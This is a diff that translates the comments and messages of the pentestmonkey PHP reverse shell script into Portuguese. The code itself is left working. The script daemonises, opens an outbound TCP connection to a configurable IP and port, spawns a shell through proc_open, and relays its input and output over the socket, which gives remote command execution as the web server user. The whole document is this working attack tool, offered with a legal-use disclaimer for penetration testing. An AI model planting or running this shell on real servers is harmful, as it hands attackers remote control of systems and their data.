@@ -1,53 +1,53 @@
 <?php
-// php-reverse-shell - A Reverse Shell implementation in PHP
+// php-reverse-shell - Uma implementação de Shell Reverso em PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  The author accepts no liability
-// for damage caused by this tool.  If these terms are not acceptable to you, then
-// do not use this tool.
+// Esta ferramenta pode ser usada apenas para fins legais. Os usuários assumem total responsabilidade
+// por quaisquer ações realizadas com esta ferramenta. O autor não se responsabiliza
+// por danos causados por esta ferramenta. Se esses termos não forem aceitáveis para você,
+// então não use esta ferramenta.
 //
-// In all other respects the GPL version 2 applies:
+// Em todos os outros aspectos, aplica-se a GPL versão 2:
 //
-// This program is free software; you can redistribute it and/or modify
-// it under the terms of the GNU General Public License version 2 as
-// published by the Free Software Foundation.
+// Este programa é software livre; você pode redistribuí-lo e/ou modificá-lo
+// nos termos da Licença Pública Geral GNU versão 2 conforme
+// publicada pela Free Software Foundation.
 //
-// This program is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
+// Este programa é distribuído na esperança de que seja útil,
+// mas SEM NENHUMA GARANTIA; sem mesmo a garantia implícita de
+// COMERCIALIZAÇÃO ou ADEQUAÇÃO A UM PROPÓSITO ESPECÍFICO. Veja a
+// Licença Pública Geral GNU para mais detalhes.
 //
-// You should have received a copy of the GNU General Public License along
-// with this program; if not, write to the Free Software Foundation, Inc.,
+// Você deve ter recebido uma cópia da Licença Pública Geral GNU junto
+// com este programa; se não, escreva para a Free Software Foundation, Inc.,
 // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 //
-// This tool may be used for legal purposes only.  Users take full responsibility
-// for any actions performed using this tool.  If these terms are not acceptable to
-// you, then do not use this tool.
+// Esta ferramenta pode ser usada apenas para fins legais. Os usuários assumem total responsabilidade
+// por quaisquer ações realizadas com esta ferramenta. Se esses termos não forem aceitáveis para
+// você, então não use esta ferramenta.
 //
-// You are encouraged to send comments, improvements or suggestions to
-// me at pentestmonkey@pentestmonkey.net
+// Você é incentivado a enviar comentários, melhorias ou sugestões
+// para mim em pentestmonkey@pentestmonkey.net
 //
-// Description
+// Descrição
 // -----------
-// This script will make an outbound TCP connection to a hardcoded IP and port.
-// The recipient will be given a shell running as the current user (apache normally).
+// Este script fará uma conexão TCP de saída para um IP e porta definidos no código.
+// O destinatário receberá um shell rodando como o usuário atual (normalmente apache).
 //
-// Limitations
+// Limitações
 // -----------
-// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
-// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
-// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+// proc_open e stream_set_blocking requerem PHP versão 4.3+ ou 5+
+// O uso de stream_select() em descritores de arquivo retornados por proc_open() falhará e retornará FALSE no Windows.
+// Algumas opções de compilação são necessárias para daemonização (como pcntl, posix). Estas raramente estão disponíveis.
 //
-// Usage
+// Uso
 // -----
-// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+// Veja http://pentestmonkey.net/tools/php-reverse-shell se você tiver dificuldades.
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '127.0.0.1';  // ALTERE AQUI
+$port = 1234;       // ALTERE AQUI
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -56,116 +56,116 @@ $daemon = 0;
 $debug = 0;
 
 //
-// Daemonise ourself if possible to avoid zombies later
+// Daemoniza o processo, se possível, para evitar processos zumbis depois
 //
 
-// pcntl_fork is hardly ever available, but will allow us to daemonise
-// our php process and avoid zombies.  Worth a try...
+// pcntl_fork quase nunca está disponível, mas permitirá daemonizar
+// o processo PHP e evitar zumbis. Vale a pena tentar...
 if (function_exists('pcntl_fork')) {
-	// Fork and have the parent process exit
+	// Faz o fork e o processo pai sai
 	$pid = pcntl_fork();
 	
 	if ($pid == -1) {
-		printit("ERROR: Can't fork");
+		printit("ERRO: Não foi possível realizar fork");
 		exit(1);
 	}
 	
 	if ($pid) {
-		exit(0);  // Parent exits
+		exit(0);  // Processo pai sai
 	}
 
-	// Make the current process a session leader
-	// Will only succeed if we forked
+	// Torna o processo atual o líder da sessão
+	// Só terá sucesso se fizermos fork
 	if (posix_setsid() == -1) {
-		printit("Error: Can't setsid()");
+		printit("Erro: Não foi possível executar setsid()");
 		exit(1);
 	}
 
 	$daemon = 1;
 } else {
-	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+	printit("AVISO: Falha ao daemonizar. Isso é bem comum e não é fatal.");
 }
 
-// Change to a safe directory
+// Muda para um diretório seguro
 chdir("/");
 
-// Remove any umask we inherited
+// Remove qualquer umask herdado
 umask(0);
 
 //
-// Do the reverse shell...
+// Executa o shell reverso...
 //
 
-// Open reverse connection
+// Abre conexão reversa
 $sock = fsockopen($ip, $port, $errno, $errstr, 30);
 if (!$sock) {
 	printit("$errstr ($errno)");
 	exit(1);
 }
 
-// Spawn shell process
+// Inicia o processo do shell
 $descriptorspec = array(
-   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+   0 => array("pipe", "r"),  // stdin é um pipe que o processo filho lerá
+   1 => array("pipe", "w"),  // stdout é um pipe que o processo filho escreverá
+   2 => array("pipe", "w")   // stderr é um pipe que o processo filho escreverá
 );
 
 $process = proc_open($shell, $descriptorspec, $pipes);
 
 if (!is_resource($process)) {
-	printit("ERROR: Can't spawn shell");
+	printit("ERRO: Não foi possível iniciar o shell");
 	exit(1);
 }
 
-// Set everything to non-blocking
-// Reason: Occsionally reads will block, even though stream_select tells us they won't
+// Define tudo como não bloqueante
+// Motivo: ocasionalmente leituras irão bloquear, mesmo que stream_select diga que não
 stream_set_blocking($pipes[0], 0);
 stream_set_blocking($pipes[1], 0);
 stream_set_blocking($pipes[2], 0);
 stream_set_blocking($sock, 0);
 
-printit("Successfully opened reverse shell to $ip:$port");
+printit("Shell reverso aberto com sucesso para $ip:$port");
 
 while (1) {
-	// Check for end of TCP connection
+	// Verifica fim da conexão TCP
 	if (feof($sock)) {
-		printit("ERROR: Shell connection terminated");
+		printit("ERRO: Conexão com shell terminada");
 		break;
 	}
 
-	// Check for end of STDOUT
+	// Verifica fim da saída padrão do processo
 	if (feof($pipes[1])) {
-		printit("ERROR: Shell process terminated");
+		printit("ERRO: Processo do shell terminado");
 		break;
 	}
 
-	// Wait until a command is end down $sock, or some
-	// command output is available on STDOUT or STDERR
+	// Espera até que um comando seja enviado por $sock, ou alguma
+	// saída esteja disponível em STDOUT ou STDERR
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
 
-	// If we can read from the TCP socket, send
-	// data to process's STDIN
+	// Se podemos ler do socket TCP, envia
+	// dados para o STDIN do processo
 	if (in_array($sock, $read_a)) {
-		if ($debug) printit("SOCK READ");
+		if ($debug) printit("SOCKET LEITURA");
 		$input = fread($sock, $chunk_size);
-		if ($debug) printit("SOCK: $input");
+		if ($debug) printit("SOCKET: $input");
 		fwrite($pipes[0], $input);
 	}
 
-	// If we can read from the process's STDOUT
-	// send data down tcp connection
+	// Se podemos ler do STDOUT do processo
+	// envia os dados para a conexão TCP
 	if (in_array($pipes[1], $read_a)) {
-		if ($debug) printit("STDOUT READ");
+		if ($debug) printit("STDOUT LEITURA");
 		$input = fread($pipes[1], $chunk_size);
 		if ($debug) printit("STDOUT: $input");
 		fwrite($sock, $input);
 	}
 
-	// If we can read from the process's STDERR
-	// send data down tcp connection
+	// Se podemos ler do STDERR do processo
+	// envia os dados para a conexão TCP
 	if (in_array($pipes[2], $read_a)) {
-		if ($debug) printit("STDERR READ");
+		if ($debug) printit("STDERR LEITURA");
 		$input = fread($pipes[2], $chunk_size);
 		if ($debug) printit("STDERR: $input");
 		fwrite($sock, $input);
@@ -178,12 +178,11 @@ fclose($pipes[1]);
 fclose($pipes[2]);
 proc_close($process);
 
-// Like print, but does nothing if we've daemonised ourself
-// (I can't figure out how to redirect STDOUT like a proper daemon)
+// Como print, mas não faz nada se já daemonizamos
+// (Não consigo descobrir como redirecionar STDOUT como um daemon de verdade)
 function printit ($string) {
 	if (!$daemon) {
 		print "$string\n";
 	}
 }
-
-?> 
+?>
